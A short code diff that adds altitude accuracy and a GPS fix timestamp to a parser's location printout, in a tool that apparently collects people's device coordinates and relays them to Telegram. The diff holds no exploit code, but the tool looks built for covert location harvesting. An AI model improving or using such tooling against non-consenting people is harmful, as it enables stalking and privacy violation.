@@ -458,16 +458,24 @@ def data_parser():
                 var_alt = result_json['alt']
                 var_dir = result_json['dir']
                 var_spd = result_json['spd']
+                # GPS accuracy instrumentation (older payloads omit these)
+                var_acc_alt = result_json.get('acc_alt', 'Not Available')
+                var_ts = result_json.get('ts', '')
 
-                data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
+                data_row.extend(
+                    [var_lat, var_lon, var_acc, var_alt, var_dir, var_spd,
+                     var_acc_alt, var_ts]
+                )
                 loc_info = f"""{Y}[!] Location Information :{W}
 
-{G}[+] {C}Latitude  : {W}{var_lat}
-{G}[+] {C}Longitude : {W}{var_lon}
-{G}[+] {C}Accuracy  : {W}{var_acc}
-{G}[+] {C}Altitude  : {W}{var_alt}
-{G}[+] {C}Direction : {W}{var_dir}
-{G}[+] {C}Speed     : {W}{var_spd}
+{G}[+] {C}Latitude       : {W}{var_lat}
+{G}[+] {C}Longitude      : {W}{var_lon}
+{G}[+] {C}Accuracy       : {W}{var_acc}
+{G}[+] {C}Altitude       : {W}{var_alt}
+{G}[+] {C}Altitude Acc.  : {W}{var_acc_alt}
+{G}[+] {C}Direction      : {W}{var_dir}
+{G}[+] {C}Speed          : {W}{var_spd}
+{G}[+] {C}Fix Timestamp  : {W}{var_ts}
 """
                 utils.print(loc_info)
                 send_telegram(result_json, 'location')
